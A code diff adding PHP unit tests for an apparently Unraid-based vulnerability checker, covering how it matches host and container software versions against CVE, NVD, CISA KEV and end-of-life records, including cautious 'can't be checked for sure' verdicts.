+    $slugs = array_values(array_map(fn ($u) => substr($u, strlen(WATCH_VULN_URLS['eol'])), array_filter($asked, fn ($u) => str_starts_with($u, WATCH_VULN_URLS['eol']))));
+    sort($slugs);
+    same('vuln fetch: endoflife.date — the fixed slugs, whether here or not; one missing noted', [['apache-http-server', 'elasticsearch', 'go', 'kibana', 'mariadb',
+        'mongodb', 'nextcloud', 'nginx', 'nodejs', 'php', 'phpmyadmin', 'postgresql', 'python', 'redis', 'roundcube', 'tomcat', 'valkey', 'zabbix'],
+        [['name' => '8.4', 'eol' => false, 'eol_from' => '2028-12-31', 'latest' => '8.4.28'], ['name' => '8.3', 'eol' => false, 'eol_from' => '2028-12-31', 'latest' => '8.3.30'],
+         ['name' => '8.1', 'eol' => true, 'eol_from' => '2025-12-31', 'latest' => '8.1.34']], '16 failed'],
+        [$slugs, readJson(watchmanVulnDir($dir) . '/eol/php.json')['cycles'] ?? null, readJson(watchmanVulnDir($dir) . '/status.json')['eol']['err'] ?? null]);
+
+    $inv = watchmanVulnInventory(['kernel' => '6.12.54-Unraid', 'php' => '8.4.28', 'vuln_images' => $by]);
+    $j = watchmanVulnJudge($dir, $inv, $t0 + 60, $by);
+    same('vuln software: each container\'s release line — 8.1 past its end, PostgreSQL 17 current; the plex image names none',
+        [[['php', 'nextcloud', '8.1.31', '8.1', true, '8.1.34'], ['php', 'web', '8.3.4', '8.3', false, '8.3.30'], ['postgresql', 'db', '17.12', '17', false, null]], ['plex']],
+        [array_map(fn ($x) => [$x['product'], $x['where'], $x['version'], $x['cycle'], $x['eol'], $x['latest']], $j['software']), $j['unknown']]);
+    same('vuln software: a container\'s PHP judged like the host\'s — 8.3.4 in web affected (fixed 8.3.8), 8.1.31 and the host\'s 8.4.28 not',
+        [['CVE-2024-4577', 'php', 'web', 'yes', '8.3.8']], array_map(fn ($x) => [$x['cve'], $x['product'], $x['where'], $x['verdict'], $x['fixed']], $j['found']));
+    $book = [];
+    watchmanVulnCompare($book, $j['found'], $t0);
+    same('vuln software: its words name the container', ['entry.vuln_known_ct_fixed', 'web'], [watchmanEntryKey($book[0]), watchmanText($book[0])['where']]);
+    $tips = [];
+    watchmanVulnTips($j, function (string $id, array $p, string $about, ?array $link) use (&$tips): void { $tips[$id] = [$p, $link['to'] ?? null]; });
+    same('vuln software: the advice — software past its end, named with its container, to Docker; its area', [[['names' => 'PHP 8.1 (nextcloud)', 'n' => 1], 'docker'], 'advice', 'vuln'],
+        [$tips['software_eol'] ?? null, WATCH_POSTURE['software_eol'], watchmanCatOfTip('software_eol')]);
+    $page = watchmanVulnPage(['vuln_on' => true], ['kev' => $t0, 'fresh' => true, 'checked' => 1, 'found' => [], 'software' => $j['software'], 'unknown' => $j['unknown']]);
+    same('vuln page: past its end or behind its newest release; the images without a version', [['nextcloud', 'web'], ['plex']],
+        [array_column($page['software'], 'where'), $page['unknown']]);
+
+    // a whole round: on, Docker answering — the container's entry, his state never holds another environment value
+    $data = "$tmp/round";
+    $src = "$tmp/src";
+    foreach (['plugins', 'extra', 'ssh'] as $d2) {
+        @mkdir("$src/$d2", 0700, true);
+    }
+    file_put_contents("$tmp/unraid-version", "version=\"7.4.1\"\n");
+    $rp = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+           'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'unraid_version' => "$tmp/unraid-version", 'kernel' => '6.12.54-Unraid',
+           'php' => '8.4.28', 'vuln_inspect' => $inspect];
+    file_put_contents($rp['syslog'], '');
+    file_put_contents($rp['go'], "#!/bin/bash\n");
+    file_put_contents($rp['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($rp['shadow'], "root:*:20000:0:99999:7:::\n");
+    $docker = fn () => ['web' => ['image' => 'php:8.4', 'tokens' => []], 'nextcloud' => ['image' => 'php:8.1', 'tokens' => []]];
+    watchmanRound($rp, $data, 1000, $t0, $docker, false, "$tmp/acks.json");
+    exec('cp -R ' . escapeshellarg(watchmanVulnDir($dir)) . ' ' . escapeshellarg("$data/feeds"));
+    watchmanVulnSet(true, $data, false);
+    watchmanRound($rp, $data, 1000, $t0 + 300, $docker, false, "$tmp/acks.json");
+    $d = watchmanLoad($data);
+    $ps = watchmanPageState($data, $t0 + 300, false);
+    same('vuln round: the container\'s entry; the advice; the page lists the software',
+        [['vuln_known:CVE-2024-4577:php:web'], true, ['nextcloud', 'web']],
+        [array_column(array_filter($d['book'], fn ($e) => str_starts_with($e['kind'], 'vuln_')), 'key'),
+         in_array('software_eol', array_column($ps['posture']['tips'] ?? [], 'id'), true), (function () use ($ps) {
+            $w = array_column($ps['vuln']['software'], 'where');
+            sort($w);
+            return $w;
+        })()]);
+    check('vuln round: no other value of an environment in his files', !preg_match('/hunter2|PASSWORD/', implode('', array_map('file_get_contents', glob("$data/*.json") ?: []))));
+    // what he checked (2026-11-25), from the judged state: this server's programs, both containers read, nothing unread
+    same('vuln round: the page says what he checked — Unraid, the kernel, PHP; 2 of 2 containers with their versions; VMs not asked here',
+        [[['unraid', '7.4.1'], ['kernel', '6.12.54-Unraid'], ['php', '8.4.28']], [['nextcloud', 'php', '8.1.31'], ['web', 'php', '8.3.4']], 2, 2, [], null],
+        [array_map(fn ($x) => [$x['product'], $x['version']], $ps['vuln']['host'] ?? []), array_map(fn ($x) => [$x['where'], $x['product'], $x['version']], $ps['vuln']['cts']),
+         $ps['vuln']['ct_total'], $ps['vuln']['ct_read'], $ps['vuln']['unread'], $ps['vuln']['vms']]);
+    hardeningRm($tmp);
+}
+
+/**
+ * Two verdicts too confident before (1.96, 2026-11-25, a test server with old software): Bash 4.3.011 against «up to and
+ * including 4.3», PHP 7.2.20 against a record that lists only the lines its vendor still maintains. Both now «can't be
+ * checked for sure», each with its reason; the counter-cases keep their verdict — an exclusive bound, a bound as precise
+ * as the version, a line still maintained when the vulnerability became known, a product without end-of-life data, a
+ * record that marks the version unaffected itself.
+ */
+function testWatchmanVulnHonest(): void
+{
+    $bc = WATCH_VULN_PRODUCTS['bash']['cna'];
+    $rec = fn (string $id, array $versions, string $default = 'unknown', ?string $pub = null) => watchmanVulnReduce(['cveMetadata' => ['cveId' => $id]
+        + ($pub ? ['datePublished' => "{$pub}T12:00:00.000Z"] : []), 'containers' => ['cna' => ['affected' => [['vendor' => 'GNU', 'product' => 'Bash',
+        'defaultStatus' => $default, 'versions' => $versions]]]]]);
+    $incl = $rec('CVE-2014-6271', [['version' => '1.14.0', 'lessThanOrEqual' => '4.3', 'status' => 'affected', 'versionType' => 'custom']]);
+    $excl = $rec('CVE-2014-6271', [['version' => '1.14.0', 'lessThan' => '4.3', 'status' => 'affected', 'versionType' => 'custom']]);
+    $fine = $rec('CVE-2014-6271', [['version' => '1.14.0', 'lessThanOrEqual' => '4.3.25', 'status' => 'affected', 'versionType' => 'custom']]);
+    same('vuln honest: «≤ 4.3» and 4.3.11 — can\'t be checked for sure (the bound is coarser); 4.3 itself and older affected; 5.3.3 still not',
+        [['maybe', null, 'rough', '4.3'], ['yes', '4.3'], ['yes', '4.3'], ['no', null]],
+        [watchmanVulnVerdict($incl, $bc, '4.3.11'), watchmanVulnVerdict($incl, $bc, '4.3'), watchmanVulnVerdict($incl, $bc, '4.2.53'), watchmanVulnVerdict($incl, $bc, '5.3.3')]);
+    same('vuln honest: the counter-cases — an exclusive «< 4.3» leaves 4.3.11 outside; «≤ 4.3.25» is as precise (4.3.30 not, 4.3.11 affected)',
+        [['no', '4.3'], ['no', null], ['yes', '4.3.25']],
+        [watchmanVulnVerdict($excl, $bc, '4.3.11'), watchmanVulnVerdict($fine, $bc, '4.3.30'), watchmanVulnVerdict($fine, $bc, '4.3.11')]);
+    same('vuln honest: OpenSSH\'s patch level — «≤ 9.7» can\'t say for 9.7p1; «≤ 9.7p1» says it cleanly (9.7p2 not affected)',
+        [['maybe', null, 'rough', '9.7'], ['no', null]],
+        [watchmanVulnVerdict(watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2024-6387'], 'containers' => ['cna' => ['affected' => [['vendor' => 'OpenBSD', 'product' => 'OpenSSH',
+            'versions' => [['version' => '8.5p1', 'lessThanOrEqual' => '9.7', 'status' => 'affected', 'versionType' => 'custom']]]]]]]), WATCH_VULN_PRODUCTS['openssh']['cna'], '9.7p1'),
+         watchmanVulnVerdict(watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2024-6387'], 'containers' => ['cna' => ['affected' => [['vendor' => 'OpenBSD', 'product' => 'OpenSSH',
+            'versions' => [['version' => '8.5p1', 'lessThanOrEqual' => '9.7p1', 'status' => 'affected', 'versionType' => 'custom']]]]]]]), WATCH_VULN_PRODUCTS['openssh']['cna'], '9.7p2')]);
+    $unaff = $rec('CVE-2014-6271', [['version' => '1.14.0', 'lessThanOrEqual' => '4.3', 'status' => 'affected', 'versionType' => 'custom'],
+                                    ['version' => '4.3.11', 'status' => 'unaffected', 'versionType' => 'custom']]);
+    same('vuln honest: a record that names 4.3.11 unaffected itself keeps «not affected»', ['no', null], watchmanVulnVerdict($unaff, $bc, '4.3.11'));
+    // a version named alone, coarser than the one here (NVD's exact CPEs for CVE-2014-6278): only a «no» becomes maybe
+    $exactList = fn (array $vs, array $more = []) => watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2014-6278'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'gnu', 'product' => 'bash', 'defaultStatus' => 'unaffected', 'versions' => array_merge(array_map(fn ($v) => ['version' => $v, 'status' => 'affected',
+            'versionType' => 'custom'], $vs), $more)]]]]]);
+    $named = $exactList(['1.14.0', '2.05', '3.2.48', '4.2', '4.3']);
+    same('vuln honest: exact «4.3» and 4.3.011 — can\'t be checked for sure (4.2.53 against exact «4.2» the same); 5.3.3 not affected; 4.3 itself affected',
+        [['maybe', null, 'rough', '4.3'], ['no', null], ['maybe', null, 'rough', '4.2'], ['yes', null]],
+        [watchmanVulnVerdict($named, $bc, '4.3.011'), watchmanVulnVerdict($named, $bc, '5.3.3'), watchmanVulnVerdict($named, $bc, '4.2.53'), watchmanVulnVerdict($named, $bc, '4.3')]);
+    same('vuln honest: an exact version never turns «affected» into maybe — 4.3.011 inside «4.3.0 ≤ 4.3.30» stays affected beside exact «4.3»', 'yes',
+        watchmanVulnVerdict($exactList(['4.3'], [['version' => '4.3.0', 'lessThanOrEqual' => '4.3.30', 'status' => 'affected', 'versionType' => 'custom']]), $bc, '4.3.011')[0]);
+    same('vuln honest: an exact version as precise as the one here stays as before (4.3.12 against exact 4.3.11: not affected); one marked unaffected itself too',
+        [['no', null], ['no', null]],
+        [watchmanVulnVerdict($exactList(['4.3.11']), $bc, '4.3.12'),
+         watchmanVulnVerdict($exactList(['4.3'], [['version' => '4.3.11', 'status' => 'unaffected', 'versionType' => 'custom']]), $bc, '4.3.11')]);
+    // NVD's CPE range «versionEndIncluding 4.3» — the same rule
+    $nvd = watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2014-6271', 'published' => '2014-09-24T18:48:04.477', 'configurations' => [['nodes' => [['operator' => 'OR',
+        'negate' => false, 'cpeMatch' => [['vulnerable' => true, 'criteria' => 'cpe:2.3:a:gnu:bash:*:*:*:*:*:*:*:*', 'versionEndIncluding' => '4.3']]]]]]]]]], 'CVE-2014-6271');
+    same('vuln honest: NVD\'s «up to and including 4.3» for 4.3.011 — maybe, its reason; its publication kept', [['maybe', null, 'rough', '4.3'], '2014-09-24'],
+        [watchmanVulnVerdict($nvd, $bc, '4.3.011'), $nvd['published'] ?? null]);
+
+    // the end-of-life rule, judged end to end: PHP's record lists 8.1–8.3 only (defaultStatus unaffected, published 2026)
+    $tmp = hardeningTmp('vuln-honest');
+    $f = watchmanVulnDir($tmp);
+    @mkdir("$f/cve", 0700, true);
+    @mkdir("$f/eol", 0700, true);
+    @mkdir("$f/nvd", 0700, true);
+    $now = 1_800_000_000;
+    writeAtomic("$f/kev.json", jsonEncode(['fetched' => $now, 'entries' => [
+        ['cve' => 'CVE-2026-1001', 'product' => 'php', 'name' => 'PHP Example Vulnerability', 'added' => '2026-06-01', 'ransom' => false, 'desc' => ''],
+        ['cve' => 'CVE-2014-6271', 'product' => 'bash', 'name' => 'GNU Bash Arbitrary Code Execution Vulnerability', 'added' => '2022-01-28', 'ransom' => false, 'desc' => ''],
+        ['cve' => 'CVE-2026-2002', 'product' => 'sudo', 'name' => 'Sudo Example Vulnerability', 'added' => '2026-06-01', 'ransom' => false, 'desc' => ''],
+        ['cve' => 'CVE-2026-3003', 'product' => 'php', 'name' => 'PHP Unaffected Example', 'added' => '2026-06-01', 'ransom' => false, 'desc' => ''],
+        ['cve' => 'CVE-2012-1823', 'product' => 'php', 'name' => 'PHP-CGI Query String Parameter Vulnerability', 'added' => '2022-03-25', 'ransom' => false, 'desc' => '']]]), 0600, 0, 0);
+    // as an older office kept it: no `published` — CISA's 2022 counts, after 7.2's end; its ranges all end below 7.2
+    writeAtomic("$f/cve/CVE-2012-1823.json", jsonEncode(['id' => 'CVE-2012-1823', 'affected' => [], 'adp' => [['vendor' => 'php', 'product' => 'php', 'defaultStatus' => 'unknown',
+        'versions' => [['version' => '0', 'status' => 'affected', 'lessThan' => '5.3.12', 'versionType' => 'custom'],
+                       ['version' => '5.4.0', 'status' => 'affected', 'lessThan' => '5.4.2', 'versionType' => 'custom']]]]]), 0600, 0, 0);
+    $php = fn (string $id, array $more = []) => watchmanVulnReduce(['cveMetadata' => ['cveId' => $id, 'datePublished' => '2026-05-20T10:00:00.000Z'],
+        'containers' => ['cna' => ['affected' => [['vendor' => 'PHP Group', 'product' => 'PHP', 'defaultStatus' => 'unaffected', 'versions' => array_merge([
+            ['version' => '8.1.0', 'lessThan' => '8.1.40', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '8.2.0', 'lessThan' => '8.2.33', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '8.3.0', 'lessThan' => '8.3.29', 'status' => 'affected', 'versionType' => 'semver']], $more)]]]]]);
+    writeAtomic("$f/cve/CVE-2026-1001.json", jsonEncode($php('CVE-2026-1001')), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2026-3003.json", jsonEncode($php('CVE-2026-3003', [['version' => '7.2.20', 'status' => 'unaffected', 'versionType' => 'semver']])), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2014-6271.json", jsonEncode($incl), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2026-2002.json", jsonEncode(watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2026-2002', 'datePublished' => '2026-05-20T10:00:00.000Z'],
+        'containers' => ['cna' => ['affected' => [['vendor' => 'sudo project', 'product' => 'sudo', 'defaultStatus' => 'unaffected', 'versions' => [
+            ['version' => '1.9.14', 'lessThan' => '1.9.17', 'status' => 'affected', 'versionType' => 'semver']]]]]]])), 0600, 0, 0);
+    // endoflife.date: 7.2 ended 2020-11-30, 7.4 on 2026-08-01 (after this record), 8.4 still maintained
+    writeAtomic("$f/eol/php.json", jsonEncode(['v' => 1, 'fetched' => $now, 'cycles' => [
+        ['name' => '8.4', 'eol' => false, 'eol_from' => '2028-12-31', 'latest' => '8.4.28'], ['name' => '7.4', 'eol' => true, 'eol_from' => '2026-08-01', 'latest' => '7.4.33'],
+        ['name' => '7.2', 'eol' => true, 'eol_from' => '2020-11-30', 'latest' => '7.2.34']]]), 0600, 0, 0);
+    $images = ['oldphp' => ['PHP_VERSION' => '7.2.20'], 'php74' => ['PHP_VERSION' => '7.4.30'], 'newphp' => ['PHP_VERSION' => '8.4.28'], 'none' => []];
+    $inv = watchmanVulnInventory(['php' => '8.4.28', 'kernel' => '6.12.54-Unraid', 'vuln_images' => $images]);
+    $inv[] = ['product' => 'bash', 'version' => '4.3.011', 'clean' => '4.3.011', 'where' => 'host'];
+    $inv[] = ['product' => 'sudo', 'version' => '1.8.31', 'clean' => '1.8.31', 'where' => 'host'];
+    $j = watchmanVulnJudge($tmp, $inv, $now + 60, $images, [], array_keys($images));
+    $rows = function (array $j): array {
+        $out = [];
+        foreach (['found' => 'affected', 'not' => 'checked', 'unsure' => 'unsure'] as $k => $as) {
+            foreach ((array) $j[$k] as $x) {
+                $out[] = "{$x['cve']} {$x['where']} $as" . (isset($x['why']) ? " {$x['why']} {$x['bound']}" : '');
+            }
+        }
+        sort($out);
+        return $out;
+    };
+    same('vuln honest: 7.2 past its end when the record came out — can\'t be checked for sure; 7.4 still maintained then and 8.4: not affected; sudo (no end-of-life data): not affected; '
+        . 'a record naming 7.2.20 unaffected: not affected; Bash 4.3.011 against «≤ 4.3»: can\'t be checked for sure',
+        ['CVE-2012-1823 host checked', 'CVE-2012-1823 newphp checked', 'CVE-2012-1823 oldphp checked', 'CVE-2012-1823 php74 checked',
+         'CVE-2014-6271 host unsure rough 4.3', 'CVE-2026-1001 host checked', 'CVE-2026-1001 newphp checked', 'CVE-2026-1001 oldphp unsure eol 7.2', 'CVE-2026-1001 php74 checked',
+         'CVE-2026-2002 host checked', 'CVE-2026-3003 host checked', 'CVE-2026-3003 newphp checked', 'CVE-2026-3003 oldphp checked', 'CVE-2026-3003 php74 checked'], $rows($j));
+    $book = [];
+    $seen = [];
+    same('vuln honest: unsure stays calm — no entry, nothing told', [[], []], [watchmanVulnCompare($book, $j['found'], $now + 60, $seen, $j['fresh'], $j['pending']), $book]);
+    // without a publication date: the day CISA listed it — listed 2019 (7.2 still maintained then): not affected
+    $kev = readJson("$f/kev.json");
+    $kev['entries'][0]['added'] = '2019-06-01';
+    writeAtomic("$f/kev.json", jsonEncode($kev), 0600, 0, 0);
+    $noPub = $php('CVE-2026-1001');
+    unset($noPub['published']);
+    writeAtomic("$f/cve/CVE-2026-1001.json", jsonEncode($noPub), 0600, 0, 0);
+    same('vuln honest: no publication date — CISA\'s date added decides; 7.2 still maintained then: not affected', true,
+        in_array('CVE-2026-1001 oldphp checked', $rows(watchmanVulnJudge($tmp, $inv, $now + 60, $images)), true));
+    // a record that names the line itself (8.1 fixed in its branch) stays clean even with the line past its end
+    same('vuln honest: a range naming the line keeps «not affected» — 8.1.45 past «8.1.0 < 8.1.40»', false,
+        watchmanVulnOutside($php('CVE-2026-1001'), WATCH_VULN_PRODUCTS['php']['cna'], '8.1.45', '8.1'));
+    same('vuln honest: only newer lines named counts — 7.2.20 above «0 < 5.3.12» and «5.4.0 < 5.4.2» (fixed before 7.2 existed) is no line left out; below 8.1–8.3 it is',
+        [false, true], [watchmanVulnOutside(readJson("$f/cve/CVE-2012-1823.json"), WATCH_VULN_PRODUCTS['php']['cna'], '7.2.20', '7.2'),
+                        watchmanVulnOutside($php('CVE-2026-1001'), WATCH_VULN_PRODUCTS['php']['cna'], '7.2.20', '7.2')]);
+    // the NVD settles an «eol» unsure when its ranges name the version
+    $kev['entries'][0]['added'] = '2026-06-01';
+    writeAtomic("$f/kev.json", jsonEncode($kev), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2026-1001.json", jsonEncode($php('CVE-2026-1001')), 0600, 0, 0);
+    writeAtomic("$f/nvd/CVE-2026-1001.json", jsonEncode(watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2026-1001', 'published' => '2026-05-20T10:00:00.000',
+        'configurations' => [['nodes' => [['operator' => 'OR', 'negate' => false, 'cpeMatch' => [['vulnerable' => true, 'criteria' => 'cpe:2.3:a:php:php:*:*:*:*:*:*:*:*',
+            'versionStartIncluding' => '7.0.0', 'versionEndExcluding' => '8.1.40']]]]]]]]]], 'CVE-2026-1001')), 0600, 0, 0);
+    $found = array_map(fn ($x) => [$x['cve'], $x['where'], $x['verdict'], $x['src']], watchmanVulnJudge($tmp, $inv, $now + 60, $images)['found']);
+    same('vuln honest: NVD names 7.x in its range — 7.2.20 affected by NVD; 7.4.30 stays as the record judged it (its line maintained then: never asked)',
+        [['CVE-2026-1001', 'oldphp', 'yes', 'nvd']], $found);
+    $page = watchmanVulnPage(['vuln_on' => true], $j);
+    same('vuln honest: the page carries each unsure row\'s reason', [['CVE-2026-1001', 'eol', '7.2', 'PHP'], ['CVE-2014-6271', 'rough', '4.3', 'Bash']],
+        array_map(fn ($x) => [$x['cve'], $x['why'] ?? null, $x['bound'] ?? null, $x['label']], $page['unsure']));
+
+    // kept records an older office reduced without `published`: asked anew at the next fetch (not after a week); a record
+    // its source gives no date for is kept with `published: null` and not asked again the next day
+    $dir = "$tmp/fetch";
+    $ff = watchmanVulnDir($dir);
+    @mkdir("$ff/cve", 0700, true);
+    @mkdir("$ff/nvd", 0700, true);
+    $kevList = [['cveID' => 'CVE-2012-1823', 'vendorProject' => 'PHP', 'product' => 'PHP', 'dateAdded' => '2022-03-25'],
+                ['cveID' => 'CVE-2014-6271', 'vendorProject' => 'GNU', 'product' => 'GNU Bash', 'dateAdded' => '2022-01-28']];
+    for ($i = 0; $i < 120; $i++) {
+        $kevList[] = ['cveID' => sprintf('CVE-2023-%05d', 40000 + $i), 'vendorProject' => 'Example Corp', 'product' => "Switch $i"];
+    }
+    $answers = [WATCH_VULN_URLS['kev'] => json_encode(['count' => count($kevList), 'vulnerabilities' => $kevList]),
+        watchmanVulnCveUrl('CVE-2012-1823') => json_encode(['cveMetadata' => ['cveId' => 'CVE-2012-1823', 'datePublished' => '2012-05-11T10:00:00.000Z'],
+            'containers' => ['cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]]]]),
+        watchmanVulnCveUrl('CVE-2014-6271') => json_encode(['cveMetadata' => ['cveId' => 'CVE-2014-6271'],      // the source names no date
+            'containers' => ['cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]]]]),
+        WATCH_VULN_URLS['nvd'] . 'CVE-2014-6271' => json_encode(['vulnerabilities' => [['cve' => ['id' => 'CVE-2014-6271', 'published' => '2014-09-24T18:48:04.477']]]])];
+    $asked = [];
+    $get = function (string $url, ?string $since) use (&$asked, $answers): array {
+        $asked[] = $url;
+        return isset($answers[$url]) ? ['code' => 200, 'body' => $answers[$url], 'lm' => null, 'err' => null] : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    $t = 1_800_000_000;
+    foreach (['CVE-2012-1823', 'CVE-2014-6271'] as $id) {           // fetched yesterday by an older office: no `published`
+        writeAtomic("$ff/cve/$id.json", jsonEncode(['v' => 1, 'fetched' => $t - 86400, 'id' => $id, 'affected' => []]), 0600, 0, 0);
+    }
+    writeAtomic("$ff/nvd/CVE-2014-6271.json", jsonEncode(['v' => 1, 'fetched' => $t - 86400, 'id' => 'CVE-2014-6271', 'affected' => []]), 0600, 0, 0);
+    $records = function () use (&$asked): array {
+        return array_values(array_filter($asked, fn ($u) => str_contains($u, 'cvelistV5') || str_contains($u, 'nvd.nist.gov')));
+    };
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $t, 'sleep' => fn () => null, 'unsure' => []]);
+    same('vuln honest: kept without a date — both records and the NVD\'s answer asked anew the next day; the dates kept, null where the source names none',
+        [3, '2012-05-11', null, true, '2014-09-24'],
+        [count($records()), readJson("$ff/cve/CVE-2012-1823.json")['published'] ?? '-', (readJson("$ff/cve/CVE-2014-6271.json") ?? [])['published'] ?? null,
+         array_key_exists('published', readJson("$ff/cve/CVE-2014-6271.json") ?? []), readJson("$ff/nvd/CVE-2014-6271.json")['published'] ?? '-']);
+    $asked = [];
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $t + 86400, 'sleep' => fn () => null, 'unsure' => []]);
+    same('vuln honest: the day after — nothing asked again (a dateless record is marked, not fetched daily)', [], $records());
+    hardeningRm($tmp);
+}
+
+/**
+ * Two «fixed in» ends read now (2026-11-25, both resting on an exclusive end): OpenSSL's letter versions («1.0.1g», only
+ * for the product the name table marks `letters`), and NVD's «after X, before Y» — past Y the range holds nothing, before
+ * it, as before, can't be said. Every other product's versions read exactly as before.
+ */
+function testWatchmanVulnLetters(): void
+{
+    same('vuln letters: OpenSSL\'s letters as a patch level — a = 1, g = 7, z = 26, za = 27; plain numbers as before; anything else unreadable',
+        [[[1, 0, 1], 7, true], [[1, 0, 1], 0], [[0, 9, 8], 26, true], [[0, 9, 8], 27, true], [[3, 5, 9], 0], null, null, null],
+        [watchmanVulnParse('1.0.1g', true), watchmanVulnParse('1.0.1', true), watchmanVulnParse('0.9.8z', true), watchmanVulnParse('0.9.8za', true),
+         watchmanVulnParse('3.5.9', true), watchmanVulnParse('1.0.1G', true), watchmanVulnParse('1.0.1ab', true), watchmanVulnParse('9.7p1', true)]);
+    same('vuln letters: every other product reads as before — no letter anywhere without the flag',
+        [[[10, 6], 1], [[1, 9, 17], 2], [[6, 40, 5], 0], null, null, '6.12.54', '14.19', '9.7p1', null, '1.0.1g', ['openssl' => true]],
+        [watchmanVulnParse('10.6p1'), watchmanVulnParse('1.9.17p2'), watchmanVulnParse('6.40.5'), watchmanVulnParse('1.0.1g'), watchmanVulnParse('6.12.54-Unraid'),
+         watchmanVulnClean('6.12.54-Unraid', 'kernel'), watchmanVulnClean('14.19-1.pgdg12+1', 'env'), watchmanVulnClean('9.7p1'), watchmanVulnClean('1.0.1g'),
+         watchmanVulnClean('1.0.1g', 'plain', true), array_map(fn ($p) => true, array_filter(WATCH_VULN_PRODUCTS, fn ($p) => !empty($p['letters'])))]);
+    // Heartbleed as NVD has it: «1.0.1 ≤ x < 1.0.1g»
+    $hb = watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2014-0160', 'published' => '2014-04-07T22:55:03.893', 'configurations' => [['nodes' => [['operator' => 'OR',
+        'negate' => false, 'cpeMatch' => [['vulnerable' => true, 'criteria' => 'cpe:2.3:a:openssl:openssl:*:*:*:*:*:*:*:*', 'versionStartIncluding' => '1.0.1',
+        'versionEndExcluding' => '1.0.1g']]]]]]]]]], 'CVE-2014-0160');
+    $oc = WATCH_VULN_PRODUCTS['openssl']['cna'];
+    same('vuln letters: Heartbleed — 3.5.9 not affected, fixed from 1.0.1g; 1.0.1f affected; 1.0.1g and 1.0.0t not (no «fixed from»: not past every range); without the flag (as before) can\'t be said',
+        [['no', '1.0.1g'], ['yes', '1.0.1g'], ['no', null], ['no', null], 'maybe'],
+        [watchmanVulnVerdict($hb, $oc, '3.5.9', true), watchmanVulnVerdict($hb, $oc, '1.0.1f', true), watchmanVulnVerdict($hb, $oc, '1.0.1g', true),
+         watchmanVulnVerdict($hb, $oc, '1.0.0t', true), watchmanVulnVerdict($hb, $oc, '3.5.9')[0]]);
+    same('vuln letters: a letter is a release of its own — «≤ 1.0.1» against 1.0.1g is clean (not affected), not «only roughly»', ['no', null],
+        watchmanVulnVerdict(watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2014-0160'], 'containers' => ['cna' => ['affected' => [['vendor' => 'OpenSSL',
+            'product' => 'OpenSSL', 'defaultStatus' => 'unaffected', 'versions' => [['version' => '1.0.0', 'lessThanOrEqual' => '1.0.1', 'status' => 'affected', 'versionType' => 'custom']]]]]]]),
+            $oc, '1.0.1g', true));
+    // judged end to end: the inventory reads the package's letter, the judge compares with it
+    $tmp = hardeningTmp('vuln-letters');
+    $f = watchmanVulnDir($tmp);
+    @mkdir("$f/cve", 0700, true);
+    @mkdir("$f/nvd", 0700, true);
+    @mkdir("$tmp/pkgs", 0700, true);
+    touch("$tmp/pkgs/openssl-1.0.1f-x86_64-1");
+    writeAtomic("$f/kev.json", jsonEncode(['fetched' => 1_800_000_000, 'entries' => [['cve' => 'CVE-2014-0160', 'product' => 'openssl', 'name' => 'OpenSSL Information Disclosure Vulnerability',
+        'added' => '2022-05-04', 'ransom' => false, 'desc' => '']]]), 0600, 0, 0);
+    writeAtomic("$f/cve/CVE-2014-0160.json", jsonEncode(watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2014-0160'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]]]])), 0600, 0, 0);
+    writeAtomic("$f/nvd/CVE-2014-0160.json", jsonEncode($hb), 0600, 0, 0);
+    $inv = array_values(array_filter(watchmanVulnInventory(['packages' => "$tmp/pkgs", 'php' => '8.4.1']), fn ($x) => $x['product'] === 'openssl'));
+    $j = watchmanVulnJudge($tmp, $inv, 1_800_000_060);
+    same('vuln letters: OpenSSL 1.0.1f from the packages read cleanly and found affected by the NVD, fixed from 1.0.1g', [['1.0.1f'], [['CVE-2014-0160', 'yes', '1.0.1g', 'nvd']]],
+        [array_column($inv, 'clean'), array_map(fn ($x) => [$x['cve'], $x['verdict'], $x['fixed'], $x['src']], $j['found'])]);
+    hardeningRm($tmp);
+
+    // NVD's «after X, before Y» (CVE-2014-0196's first range: after 2.6.31, before 3.2.59) beside clean ranges
+    $cpe = fn (array $m) => ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:linux:linux_kernel:*:*:*:*:*:*:*:*'] + $m;
+    $k = watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2014-0196', 'published' => '2014-05-07T10:55:04.337', 'configurations' => [['nodes' => [['operator' => 'OR',
+        'negate' => false, 'cpeMatch' => [$cpe(['versionStartExcluding' => '2.6.31', 'versionEndExcluding' => '3.2.59']), $cpe(['versionStartIncluding' => '3.3', 'versionEndExcluding' => '3.4.91']),
+        $cpe(['versionStartIncluding' => '3.5', 'versionEndExcluding' => '3.10.40']), $cpe(['versionStartIncluding' => '3.11', 'versionEndExcluding' => '3.12.20']),
